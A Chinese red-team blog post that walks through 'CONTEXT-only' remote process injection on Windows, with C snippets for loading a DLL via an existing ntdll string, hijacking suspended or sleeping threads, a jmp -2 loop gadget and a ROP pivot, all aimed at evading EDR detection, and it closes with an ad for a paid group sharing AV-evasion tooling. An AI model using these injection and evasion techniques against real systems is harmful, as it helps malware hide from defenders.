#  探讨进程注入：CONTEXT-Only  
原创 半只红队  半只红队   2025-06-09 14:22  
  
在基本的远程进程注入中，EDR会监视这经典的三个迹象：  
- 给进程分配新的内存：VirtualAllocEx  
  
- 修改此进程的内存：WriteProcessMemory、VirtualProtectEx  
  
- 执行：CreateRemoteThread  
  
在这篇文章中，我们依据这一篇文章（https://blog.fndsec.net/2025/05/16/the-context-only-attack-surface/）进行讲解：测试远程进程注入的下限。  
## Learn from LoadLibrary  
  
在DLL注入中，我们会给进程分配一块空间用来存储DLL的路径，以便在目标进程中拥有有效的可寻址数据，接着写入DLL的路径，最后使用CreateRemoteThread远程执行LoadLibraryA，参数即远程写入的DLL路径的内存地址。  
  
LoadLibrary会自动将.dll附加到它接受的任何字符串，接着按照DLL的搜索顺序进行搜索，所以，我们可以找到一个进程内现有的字符串，例如“0”，并在某个位置放置一个名为0.dll的文件。我们CreateRemoteThread启动一个远程线程，启动例程为LoadLibraryA，参数为目标内“0”字符串的地址，最终导致DLL被加载到目标进程中。  
  
那“0”这个字符串如何找呢？这得说说Windows对于系统DLL的特性了，Windows将系统DLL映射到各个进程中，这些部分由相同的物理内存支持，每个进程仅接受其虚拟地址的视图。此时他们的内存属性还是共享的，若是某个进程尝试修改它们，系统内核会创建此页面的私有副本，确保不会影响共享的内存。另外，系统DLL会在所有进程中加载到一致的基地址，以优化重定位的性能。  
  
所以，当前进程里的如ntdll base+0x10086这样的地址，在所有的进程中都基本指向相同的字节。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FnzeUmRapq7hYz1Vb1OIWnKF75FbUaiafk5hoUw7MfVePSgMT9F2QdOQaw63OicXqvcATsHCMEwlIdW1VzLib25Iw/640?wx_fmt=png&from=appmsg "")  
  
代码例子如下所示：  
```
HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD, FALSE, pid);if (hProcess == INVALID_HANDLE_VALUE) {    printf("[-] False to Open Process Handle pid: %d\n", pid);    return-1;}// Find the '0' from ntdllMEMORY_BASIC_INFORMATION mbi;LPVOID pZero = NULL;ULONG_PTR pNtdll = (ULONG_PTR)GetModuleHandleA("ntdll.dll");while (VirtualQuery(pNtdll, &mbi, sizeof(mbi)) == sizeof(mbi)) {    if (mbi.State == MEM_COMMIT && (mbi.Protect & PAGE_READONLY)) {        if (mbi.RegionSize < 2) {            pNtdll = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);            continue;        }        BYTE* base = (BYTE*)mbi.BaseAddress;        for (size_t i = 0; i < mbi.RegionSize - 1; i++) {            if (base[i] == '0' && base[i + 1] == 0) {                pZero = (LPVOID)((DWORD_PTR)mbi.BaseAddress + i);                break;            }        }        if (pZero)            break;    }    if ((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize < (DWORD_PTR)mbi.BaseAddress) {        break;    }    pNtdll = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);}HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pfnLoadLibraryA, pZero, 0, NULL);if (!hThread) {    printf("[+] Can not CreateRemoteThread, GetLastError: %d\n", GetLastError());    return-1;}
```  
  
创建远程线程一定是一个恶意的行为吗？在原文作者利用ETW捕获创建者PID≠目标PID的线程创建事件，发现一分钟内有非常多的远程线程创建，而在360核晶环境下直接使用该方法却还是会报注入。  
## Context-Only？  
  
想到CreateRemoteThread还可以这么做，那为何不优化一下远程线程注入呢？我们不去远程分配VirtualAllocEx一块内存，那可以让目标进程自己分配一块内存。VirtualAlloc有四个参数，但是CreateRemoteThread仅给你一个，所以CONTEXT来了，创建挂起的线程、GetThreadContext、SetThreadContext、ResumeThread一连下来应该可行？  
  
而实际上却不能直接做到，下面是复现原作者的debug过程：  
### Empty Initial Stack  
  
首先远程创建一个处于挂起状态的线程，接着使用GetThreadContext、SetThreadContext、ResumeThread恢复线程：  
```
 HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pfnMessageBoxA, NULL, CREATE_SUSPENDED, NULL);printf("[+] Thread ID: %d\n", GetThreadId(hThread));// Change Context CONTEXT ctx; ctx.ContextFlags = CONTEXT_ALL; GetThreadContext(hThread, &ctx); ctx.Rip = pfnVirtualAlloc; ctx.Rcx = NULL; ctx.Rdx = 0x2000; ctx.R8 = MEM_RESERVE | MEM_COMMIT; ctx.R9 = PAGE_EXECUTE_READWRITE; SetThreadContext(hThread, &ctx); ResumeThread(hThread); WaitForSingleObject(hThread, INFINITE);
```  
  
结果就是崩溃。。。原因是线程以空堆栈启动即不是一个正常的堆栈，从VirtualAlloc返回发生了内存访问冲突。到底有没有调用到VirtualAlloc呢？有的，可以试试换成MessageBoxA（记得rdx、r8设为NULL更好，因为对于目标进程不是一个有效的地址），直到去掉弹框，就寄了。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FnzeUmRapq7hYz1Vb1OIWnKF75FbUaiafg9Aiafk8J4A985TKZjxYqGH293O9iaGQHyl9Fa9icnxULeDYNKLRWLicHw/640?wx_fmt=png&from=appmsg "")  
>   
> 为什么直接使用CreateRemoteThread不会崩溃呢？因为正常启动一个线程时，线程初始化会经历RtlUserThreadStart->BaseThreadinitThunk的过程，这个过程会设置正常的堆栈框架等，最后调用目标例程。  
  
  
所以萌生了第二个想法，不是要获取一个正常的初始堆栈吗？那我偷一个。  
### Stealing Valid Stack from Another Thread  
  
由于一定需要一个正常的堆栈，所以作者考虑让新线程执行Sleep睡眠，窃取这个堆栈，然后创建第二个挂起线程并覆盖CONTEXT。  
```
 HANDLE hSleepThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pfnSleep, INFINITE, 0, NULL);printf("[+] Sleep Thread ID: %d\n", GetThreadId(hSleepThread)); Sleep(1000); CONTEXT ctx; ctx.ContextFlags = CONTEXT_ALL; GetThreadContext(hSleepThread, &ctx); HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pfnMessageBoxA, INFINITE, CREATE_SUSPENDED, NULL); CONTEXT ctx2; ctx2.ContextFlags = CONTEXT_ALL; GetThreadContext(hThread, &ctx2); ctx2.Rip = pfnVirtualAlloc; ctx2.Rsp = ctx.Rsp; ctx2.Rcx = NULL;  ctx2.Rdx = 0x2000; ctx2.R8 = MEM_RESERVE | MEM_COMMIT; ctx2.R9 = PAGE_EXECUTE_READWRITE; SetThreadContext(hThread, &ctx2); ResumeThread(hThread);
```  
  
结果也是返回过程中出现崩溃，原因是剽窃的堆栈有效但是新线程的TEB为空，新线程BaseThreadInitThunk需要初始化字段（SEH列表、TLS等），取消引用TEB->NtTib.ExceptionList会触发内存访问冲突。  
### Hijacking the Sacrificial Sleep Thread  
  
创建一个执行Sleep的线程，线程在休眠时期劫持CONTEXT，设置RIP为VirtualAlloc以及其参数，等到Sleep结束，线程应该在VirtualAlloc中恢复。  
```
 HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pfnSleep, 10000, 0, NULL); printf("[+] Sleep Thread ID: %d\n", GetThreadId(hThread)); Sleep(1000); CONTEXT ctx; ctx.ContextFlags = CONTEXT_ALL; GetThreadContext(hThread, &ctx); ctx.Rip = pfnVirtualAlloc; ctx.Rcx = NULL; ctx.Rdx = 0x2000; ctx.R8 = MEM_RESERVE | MEM_COMMIT; ctx.R9 = PAGE_EXECUTE_READWRITE; SetThreadContext(hThread, &ctx);
```  
  
结果是线程按照预期执行到VIrtualAlloc且ProcessHacker可以看到线程栈确实存在，但是VirtualAlloc之后栈就没有了，可知VirtualAlloc失败返回时会崩溃。原因是睡眠期间只有RIP可以可靠得写入，睡眠结束后似乎会覆盖忽略其余得上下文。  
### Sleep alternative, the Loop Gadget and CFG  
  
根据上一个方法的启发，我们需要寻找一种不会影响寄存器又方便我们修改线程上下文的方式，所以想到了jmp -2，实现代码如下：  
```
 MEMORY_BASIC_INFORMATION mbi; BYTE* baseAddress = (BYTE*)hKernel32; BYTE* currentAddress = baseAddress; BYTE pattern[] = { 0xEB, 0xFE }; ULONG_PTR targetAddress = NULL;while (VirtualQuery(currentAddress, &mbi, sizeof(mbi))) {if (mbi.State == MEM_COMMIT && (mbi.Protect & PAGE_EXECUTE_READ)) {   BYTE* start = (BYTE*)mbi.BaseAddress;   BYTE* end = start + mbi.RegionSize;   for (BYTE* ptr = start; ptr < end - sizeof(pattern) + 1; ptr++) {    if (ptr[0] == pattern[0] && ptr[1] == pattern[1]) {     targetAddress = (ULONG_PTR)ptr;     printf("[+] Found JMP -2 at: 0x%p\n", ptr);     break;    }   }   if (targetAddress) break;  }  currentAddress = (BYTE*)mbi.BaseAddress + mbi.RegionSize; } system("pause"); HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)targetAddress, NULL, 0, NULL);//HANDLE hThread = CreateThread(0, 0, targetAddress, 0, 0, 0);printf("[+] Sleep Thread ID: %d\n", GetThreadId(hThread));
```  
  
结果是启动之后就崩溃了，原因是CreateRemoteThread直接触发了CFG控制流保护机制导致进程立即崩溃（可以试试自己写的进程，关闭CFG，是不会崩溃的）。  
### Double Hijack: Loop Gadget Pivo  
  
根据上两种方法，其一是睡眠期间貌似只有RIP是可以做有效修改的，其二是CreateRemoteThread会由于触发CFG直接崩溃，那么结合一下，让他正常进入Sleep睡眠，接着修改RIP指向jmp -2，最后修改线程上下文，这样是不会出错的（我试的时候小概率崩溃...）。![](https://mmbiz.qpic.cn/sz_mmbiz_png/FnzeUmRapq7hYz1Vb1OIWnKF75FbUaiafOkiboe6Vzk4h1DD2dMNCQt3vry12T0L0zqBRUpgJgg5mQqZXebpOHbA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FnzeUmRapq7hYz1Vb1OIWnKF75FbUaiafgw0LCrEpNOeOuJvBxGCmVibv3FRVyK2b2vhiaSZZ2zu05G08n3tF7aeg/640?wx_fmt=png&from=appmsg "")  
```
 HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pfnSleep, 3000, 0, NULL);printf("[+] Sleep Thread ID: %d\n", GetThreadId(hThread));// jmp -2 CONTEXT ctx = { 0 }; ctx.ContextFlags = CONTEXT_ALL; GetThreadContext(hThread, &ctx); ctx.Rip = targetAddress; SetThreadContext(hThread, &ctx); Sleep(1000); SuspendThread(hThread);// Inline VirtualAlloc CONTEXT ctx2 = { 0 }; ctx2.ContextFlags = CONTEXT_ALL; GetThreadContext(hThread, &ctx2); ctx2.Rip = (DWORD64)pfnVirtualAlloc; ctx2.Rcx = (DWORD64)NULL; ctx2.Rdx = (DWORD64)0x10000; ctx2.R8 = (DWORD64)(MEM_RESERVE | MEM_COMMIT); ctx2.R9 = (DWORD64)PAGE_EXECUTE_READWRITE; SetThreadContext(hThread, &ctx2); ResumeThread(hThread);
```  
  
那如何知道分配的内存在哪里呢？改一下VirtualAlloc第一个参数就行了。  
  
进程之间内存不能直接访问，那如何跨进程进行写入操作呢？RtlFillMemory一个个字节写进去就行了。  
### Fixing the Stack using ROP  
  
由于作者认为两次等待太麻烦时间了，他想出了第二种方式，使用ROP，这个ROP呢，如下：  
```
push reg1push reg2ret
```  
  
其中reg1、reg2为RAX/RBX/RBP/RDI/RSI/R10-15，其中之一都行，以VirtualAlloc为例，push RtlExitThread入栈，push VirtualAlloc入栈，接着执行ret操作跳转到VirtualAlloc函数中。由于4个传参寄存器没有修改过，所以是可以执行成功的，最后分配内存后执行RtlExitThread完美退出线程。  
  
虽然看上去挺完美的，但还是离不开CONTEXT，还是离不开去设置CONTEXT，而作者的源代码对于这种方法还是进行了VirtualAllocEx，并且这个ROP在EXECUTE属性中我是基本找不到的，所以这个方法巧妙是巧妙，对于我来说我还是喜欢两次等待的方式。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/FnzeUmRapq7hYz1Vb1OIWnKF75FbUaiafX87u1ibpQFzmcHnepuH9ZfbnzQ2hyZjF9zk0FYMsEsBdWASfju9JYMQ/640?wx_fmt=png&from=appmsg "")  
## 写在后面  
  
本篇文章参考https://blog.fndsec.net/2025/05/16/the-context-only-attack-surface，项目源代码https://github.com/Friends-Security/RedirectThread。读后评价为，这是一种挺巧妙的方式，作者在原文中也提出了很多对于EDR的简介，以及后期修改的建议。  
### 圈子介绍  
### 圈子内部致力于红蓝对抗，武器免杀与二开，不定期分享前沿技术文章，经验总结，学习笔记以及自研工具与插件，进圈联系~  
### 圈子已满200余人，目前价格199，学生优惠30  
### 后续升价  
###   
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/FnzeUmRapq4kT2c3qISNJSRoRmK9NhjDKHMT0m5F0CkGGZdxLcEXYVlEwGNJ7HnIPc44qc6gf9fPuuVqiadVKZQ/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
